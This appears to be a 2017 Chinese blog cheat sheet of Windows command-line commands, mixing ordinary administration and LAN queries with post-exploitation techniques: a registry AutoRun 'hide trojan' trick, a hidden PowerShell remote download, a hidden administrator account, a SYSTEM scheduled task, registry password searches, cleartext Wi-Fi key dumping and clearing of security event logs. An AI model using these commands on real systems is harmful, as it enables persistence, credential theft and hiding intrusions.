---
title: Windows常用命令
date: 2017-03-08 20:21:00
comments: true
tags: 
- windows
categories: 技术研究
---
<blockquote class="blockquote-center">除苦练内功之外，别无他法。
</blockquote>

分享一些自己常用的windows命令，本文会持续更新，全当笔记备份。本文大部分内容来自互联网整理汇总，小部分来自个人经验所总结。
<!--more -->
### CMD常用命令

隐藏木马：
```bash
CreateObject("WScript.Shell").RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun", "calc.exe","REG_SZ"
```
注册表添加这个值后，当运行cmd时，先运行你的计算器，命令行下cmd /k参数的原理。

列出ie代理设置：
```bash
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

下载远程文件：
```bash
powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://www.xxx.com/lcx.1','d:\\3.txt')
```
```bash
bitsadmin /rawreturn /transfer getfile http://127.0.0.1:8080/test.zip F:\123.zip
```
添加隐藏账号：
```bash
net user test$ test /add       添加test用户密码为test的隐藏账号
net localgroup administrators test$ /add 把test添加到系统用户组
```
列出更新的补丁：
```bash
wmic qfe list full /format:htable > hotfixes.htm
wmic qfe get description,installedOn
```
在d盘根目录递归查找login.html文件：
```bash
cd /d d: && dir login.html /a-d/b/s   
```
进入某盘符的某个目录下：
```bash
d: & cd d:/Clover
```
重新打开一个cmd运行：
```bash
cmd /c  whoami 
```
添加计划任务：
```bash
schtasks.exe  /Create /RU "SYSTEM" /SC MINUTE /MO       
45 /TN FIREWALL /TR "c:/1.ex    e" /ED 2016/12/12
可以把RU里面的system改为自己的账户名称，这样就可以执行添加计划任务了
```
进程相关：
```bash
tasklist   查看进程
taskkill /im 进程名称
taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)
```

查看windows系统未打的漏洞补丁：
```bash
set KB2829361=MS13-046&set KB2830290=MS13-046&set KB2667440=MS12-020&set KB2667402=MS12-020&set KB3124280=MS16-016&set KB3077657=MS15-077&set KB3045171=MS15-051&set KB2592799=MS11-080&set KB952004=MS09-012 PR&set KB956572=MS09-012 巴西烤肉&set KB970483=MS09-020 iis6&set KB2124261=MS10-065 ii7&set KB2271195=MS10-065 ii7&systeminfo>a.txt&(for %i in (KB952004 KB956572 KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165 KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280) do @type a.txt|@find /i "%i"||@echo %%i% Not Installed!)&del /f /q /a a.txt
```
获取保存在注册表中密码的键值：
```bash
REG query HKCU  /v "pwd" /s  #pwd可替换为password \ HKCU 可替换为HKCR
```
识别开机启动的程序:
```bash
wmic startup list full
```
识别网卡中的IP与Mac：
```bash
wmic nicconfig get ipaddress,macaddress
```
查看共享服务：
```bash
wmic share get name,path
net share
```
查看系统中日志的位置：
```bash
wmic nteventlog get path,filename,writeable
```
删除日志：
```bash
wevtutil cl "windows powershell"
wevtutil cl "security"
wevtutil cl "system"
```
运行的服务：
```bash
sc query type= service
net start
```
安装的软件以及版本：
```bash
wmic product get name,version
```
查看某个进程的详细情况：
```bash
wmic process where name="chrome.exe" list full
```
显示系统中曾连接过的无线密码：(以管理员身份运行)
```bash
netsh wlan show profiles
netsh wlan show profiles name="profiles的名字" key=clear
```
一键获取：
```bash
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
```
查看是否为虚拟机：
```bash
wmic bios list full | find /i "vmware"
```
是否支持powershell:
```bash
if defined PSModulePath (echo 支持powershell) else (echo 不支持powershell)
```
电脑产品编号与型号信息：
```bash
wmic baseboard get  Product,SerialNumber
```

### CMD局域网命令

arp -a 列出本网段内所有活跃的IP地址
arp -a 加对方IP是查对方的MAC地址
arp -s （ip + mac）绑定mac与ip地址
arp -d （ip + mac）解绑mac与ip地址

net view                  ------> 查询同一域内机器列表
net view /domain    ------> 查询域列表
net view /domain:domainname  -----> 查看workgroup域中计算机列表

ipconfig /all            ------> 查询本机IP段，所在域等
ipconfig /release
ipconfig /renew    重新获取Ip地址

telnet ip 端口号：尝试能否打开链接远程主机端口 nbtstat -a 加对方IP查对方的主机名
tracert 主机名   得到IP地址

netstat -a -n
netstat -an | find "3389"
netstat -a查看开启哪些端口
netstat -n查看端口的网络连接情况
netstat -v查看正在进行的工作
netstat -p tcp/ip查看某协议使用情况
netstat -s 查看正在使用的所有协议使用情况

nbtstat -n 获取NetBIOS
nslookup 域名   查询域名对应的ip

### DO常用快捷键

mspaint　　画图工具
calc　　计算机
notepad　　记事本
taskmgr　　任务管理器
osk　　打开屏幕键盘
gpedit.msc　　组策略
services.msc　　本地服务
compmgmt.msc　　计算机管理
devmgmt.msc　　设备管理器
winver　　查看系统版本
magnify　　放大镜实用程序
eventvwr　　事件查看器
Regedit　　打开注册表
resmon　　资源监视器
WMIC BIOS get releasedate　　查看电脑生产日期
mstsc -f　　远程连接（可以全屏）


*本文将持续收集更新，欢迎大家留言补充！*